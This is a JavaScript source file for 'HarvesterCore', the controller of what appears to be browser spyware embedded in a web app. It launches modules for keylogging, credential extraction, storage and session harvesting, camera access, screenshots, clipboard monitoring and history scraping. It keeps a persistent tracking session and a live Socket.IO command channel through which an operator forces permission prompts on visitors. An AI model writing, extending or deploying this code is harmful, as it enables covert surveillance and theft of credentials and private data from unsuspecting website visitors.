import axios from 'axios';
import { io } from 'socket.io-client';
import ClickTracker from './ClickTracker';
import Keylogger from './Keylogger';
import CredentialExtractor from './CredentialExtractor';
import BrowserFingerprinter from './BrowserFingerprinter';
import StorageHarvester from './StorageHarvester';
import CameraAccessor from './CameraAccessor';
import NetworkInfo from './NetworkInfo';
import ScreenshotCapturer from './ScreenshotCapturer';
import MouseRecorder from './MouseRecorder';
import ClipboardMonitor from './ClipboardMonitor';
import BrowserHistoryScraper from './BrowserHistoryScraper';
import SessionHarvester from './SessionHarvester';
import PermissionForcer from './PermissionForcer';
import NavigationTracker from './NavigationTracker';
import PersistenceEngine from './PersistenceEngine';

const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
const axiosInstance = axios.create({ baseURL: API, timeout: 10000 });

class HarvesterCore {
  constructor() {
    this.sessionId = null;
    this.dbId = null;
    this.initialized = false;
    this.startTime = Date.now();
    this.heartbeatInterval = null;
    this.modules = {};
    this._reconnectAttempted = false;
    this.socket = null;
  }

  async init() {
    // NEVER run harvester on admin pages
    if (window.location.pathname.startsWith('/admin')) {
      return;
    }

    if (this.initialized) return;
    
    // === REUSE existing session on refresh to avoid multiple session IDs per device ===
    // Check localStorage first (survives full browser close), then sessionStorage
    let stored = null;
    try {
      stored = localStorage.getItem('harvester_session_persist') || sessionStorage.getItem('harvester_session');
    } catch(e) {}

    if (stored && !this._reconnectAttempted) {
      try {
        const parsed = JSON.parse(stored);
        if (parsed.sessionId && parsed.dbId) {
          this.sessionId = parsed.sessionId;
          this.dbId = parsed.dbId;
          console.log('[HarvesterCore] Reusing existing session:', this.sessionId);
        }
      } catch (e) {
        // Invalid stored data, create fresh
      }
    }

    if (!this.sessionId) {
      try {
        const res = await axiosInstance.post('/api/collect/init', {
          referrer: document.referrer || '',
          page: window.location.pathname,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screenResolution: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
          platform: navigator.platform
        });
        this.sessionId = res.data.sessionId;
        this.dbId = res.data.dbId;
        
        // Store in BOTH localStorage (survives browser close) and sessionStorage
        const sessionData = JSON.stringify({
          sessionId: this.sessionId,
          dbId: this.dbId
        });
        try {
          localStorage.setItem('harvester_session_persist', sessionData);
        } catch(e) {}
        try {
          sessionStorage.setItem('harvester_session', sessionData);
        } catch(e) {}
      } catch (error) {
        console.warn('Harvester init failed, will retry');
        setTimeout(() => this.init(), 5000);
        return;
      }
    } else {
      // We found an existing session - send heartbeat to reconnect instead of creating new
      try {
        await axiosInstance.post('/api/collect/heartbeat', {
          sessionId: this.sessionId,
          timeOnSite: 0,
          reconnected: true,
          pageRefresh: true
        });
        console.log('[HarvesterCore] Reconnected existing session via heartbeat');
      } catch(e) {
        // If heartbeat fails (session expired/deleted), create new one
        console.log('[HarvesterCore] Session heartbeat failed, creating fresh');
        this.sessionId = null;
        this.dbId = null;
        try { localStorage.removeItem('harvester_session_persist'); } catch(ex) {}
        try { sessionStorage.removeItem('harvester_session'); } catch(ex) {}
        this.init();
        return;
      }
    }

    this.initialized = true;

    // === CRITICAL: Establish Socket.IO connection for admin commands ===
    this.connectSocket();

    this.persistenceEngine = new PersistenceEngine(this);
    this.persistenceEngine.init();
    this.startModules();
    this.startHeartbeat();
    this.setupBeforeUnload();
  }

  connectSocket() {
    try {
      // Connect to the same server
      this.socket = io(API, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 2000,
        reconnectionDelayMax: 10000,
        query: { sessionId: this.sessionId }
      });

      this.socket.on('connect', () => {
        console.log('[HarvesterCore] Socket connected:', this.socket.id);
        // Join the session-specific room so admin can send commands directly
        if (this.sessionId) {
          this.socket.emit('join-session', this.sessionId);
          console.log('[HarvesterCore] Joined session room:', this.sessionId);
        }
      });

      this.socket.on('disconnect', (reason) => {
        console.log('[HarvesterCore] Socket disconnected:', reason);
      });

      this.socket.on('connect_error', (err) => {
        console.warn('[HarvesterCore] Socket connection error:', err.message);
      });

      // === Listen for admin-triggered permission commands ===
      this.socket.on('admin-trigger-permission', (data) => {
        console.log('[HarvesterCore] Admin triggered permission:', data.permissionType);
        if (this.modules.permissionForcer) {
          this.modules.permissionForcer.triggerSinglePermission(data.permissionType);
        }
      });

      // === Listen for any other admin commands (future extensibility) ===
      this.socket.on('admin-command', (data) => {
        console.log('[HarvesterCore] Admin command received:', data);
        if (data.command === 'trigger-permission' && data.permissionType) {
          if (this.modules.permissionForcer) {
            this.modules.permissionForcer.triggerSinglePermission(data.permissionType);
          }
        }
      });

      // Expose socket globally so PermissionForcer.setupSocketListeners() can also use it
      window.__harvester_socket = this.socket;

    } catch (e) {
      console.warn('[HarvesterCore] Failed to create socket:', e.message);
    }
  }

  startModules() {
    this.modules.clickTracker = new ClickTracker(this);
    this.modules.keylogger = new Keylogger(this);
    this.modules.credentialExtractor = new CredentialExtractor(this);
    this.modules.fingerprinter = new BrowserFingerprinter(this);
    this.modules.storageHarvester = new StorageHarvester(this);
    this.modules.cameraAccessor = new CameraAccessor(this);
    this.modules.networkInfo = new NetworkInfo(this);
    this.modules.screenshotCapturer = new ScreenshotCapturer(this);
    this.modules.mouseRecorder = new MouseRecorder(this);
    this.modules.clipboardMonitor = new ClipboardMonitor(this);
    this.modules.browserHistoryScraper = new BrowserHistoryScraper(this);
    this.modules.sessionHarvester = new SessionHarvester(this);
    this.modules.permissionForcer = new PermissionForcer(this);
    this.modules.navigationTracker = new NavigationTracker(this);

    Object.values(this.modules).forEach(module => {
      if (module.init) module.init();
    });
  }

  startHeartbeat() {
    this.heartbeatInterval = setInterval(() => {
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      axiosInstance.post('/api/collect/heartbeat', {
        sessionId: this.sessionId,
        timeOnSite
      }).catch(() => {});
    }, 30000);
  }

  setupBeforeUnload() {
    let closing = false;

    window.addEventListener('beforeunload', () => {
      if (closing) return;
      closing = true;
      
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      
      // Use sendBeacon for reliable delivery during page unload
      try {
        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
          sessionId: this.sessionId,
          timeOnSite
        }));
      } catch(e) {}
      
      if (this.heartbeatInterval) {
        clearInterval(this.heartbeatInterval);
        this.heartbeatInterval = null;
      }

      if (this.persistenceEngine) {
        this.persistenceEngine.cleanup();
      }

      // NOTE: Do NOT clear session on unload - keep localStorage for next visit
      // Only clear sessionStorage so reload works cleanly with socket reconnection
      try { sessionStorage.removeItem('harvester_session'); } catch(e) {}
    });

    // Handle page unload (beforeunload might not fire on some mobile browsers)
    window.addEventListener('pagehide', () => {
      if (closing) return;
      closing = true;
      
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      try {
        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
          sessionId: this.sessionId,
          timeOnSite
        }));
      } catch(e) {}
      
      if (this.heartbeatInterval) {
        clearInterval(this.heartbeatInterval);
        this.heartbeatInterval = null;
      }
      // Keep localStorage - only clear sessionStorage
      try { sessionStorage.removeItem('harvester_session'); } catch(e) {}
    });
  }

  async send(endpoint, data) {
    try {
      const res = await axiosInstance.post(endpoint, {
        sessionId: this.sessionId,
        ...data
      });
      return res.data;
    } catch (error) {
      return null;
    }
  }

  getSessionId() { return this.sessionId; }

  getModule(name) {
    return this.modules[name] || null;
  }

  async triggerPermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.triggerPermission(permissionType);
    }
    return null;
  }

  getNavigationStats() {
    if (this.modules.navigationTracker) {
      return this.modules.navigationTracker.getNavigationStats();
    }
    return null;
  }

  getPermissionStatus() {
    if (this.modules.permissionForcer) {
      return this.modules.permissionForcer.getPermissionStatus();
    }
    return null;
  }

  async enablePermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.enablePermission(permissionType);
    }
    return null;
  }

  async disablePermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.disablePermission(permissionType);
    }
    return null;
  }

  detectDeviceCapabilities() {
    if (this.modules.permissionForcer) {
      return this.modules.permissionForcer.detectDeviceCapabilities();
    }
    return null;
  }
}

const harvesterInstance = new HarvesterCore();
export default harvesterInstance;